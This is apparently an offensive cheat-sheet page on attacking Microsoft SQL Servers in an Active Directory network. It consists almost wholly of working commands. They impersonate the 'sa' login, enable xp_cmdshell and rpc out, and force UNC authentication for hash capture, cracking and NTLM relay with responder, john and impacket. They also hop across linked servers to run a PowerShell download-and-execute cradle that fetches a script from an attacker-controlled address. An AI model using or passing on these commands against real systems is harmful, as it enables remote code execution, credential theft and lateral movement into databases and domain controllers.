---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/ms-sql-servers/sql-server-management
---

# SQL Server Management

## First Instance

```sql
# Enumeration
select CURRENT_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
select loginname from syslogins where sysadmin = 1
SELECT srvname, srvproduct, rpcout FROM master..sysservers

# Impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
EXECUTE AS login = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin')

# Enable RCP Out
EXECUTE AS LOGIN = 'sa'; EXEC sp_serveroption 'APPSRV01','rpc out','true'

# Verify Xp_cmdshell
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

# Enable Xp_cmdshell
EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options',1;RECONFIGURE ;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE

# Execute Xp_cmdshell
exec xp_cmdshell 'powershell -enc base64'
 
# UNC Path
EXEC xp_dirtree '\\10.10.10.10\test'
└─$ sudo responder -I tun0 -v    #Capture Hash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    #CrackHash
└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10    #NTLM Relay
```

## Second Instance

```sql
# Enumeration
exec ('select CURRENT_USER') AT APPSRV01
exec ('select @@servername') AT APPSRV01

# Impersonate
EXEC ('EXECUTE AS login = ''sa''; SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT APPSRV01

# Verify Xp_cmdshell
EXEC ('SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''') AT APPSRV01

# Enable Xp_cmdshell
EXEC ('EXEC sp_configure ''show advanced options'', 1;RECONFIGURE;exec SP_CONFIGURE ''xp_cmdshell'', 1;RECONFIGURE') AT APPSRV01

# Execute Xp_cmdshell
EXEC ('EXEC xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring(''http://10.10.10.10/run.txt'')"') AT APPSRV01
```

## Third Instance

```sql
# Enumeration
EXEC ('EXEC (''select @@servername'') AT DC01') AT APPSRV01
EXEC ('EXEC (''select loginname from syslogins where sysadmin = 1'') AT APPSRV02') AT APPSRV01

# Impersonate
EXEC ('EXEC (''EXECUTE AS login = ''''sa''''; SELECT IS_SRVROLEMEMBER(''''sysadmin'''')'')AT APPSRV02') AT APPSRV01

# Verify Xp_cmdshell
EXEC ('EXEC (''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''') AT APPSRV02') AT APPSRV01

# Enable Xp_cmdshell
EXEC ('EXEC (''EXEC sp_configure ''''show advanced options'''', 1;RECONFIGURE;exec SP_CONFIGURE ''''xp_cmdshell'''', 1;RECONFIGURE'') AT APPSRV02') AT APPSRV01

# Execute Xp_cmdshell
EXEC ('EXEC (''EXEC xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring(''''http://10.10.10.10/run.txt'''')"'') AT APPSRV02') AT APPSRV01
```
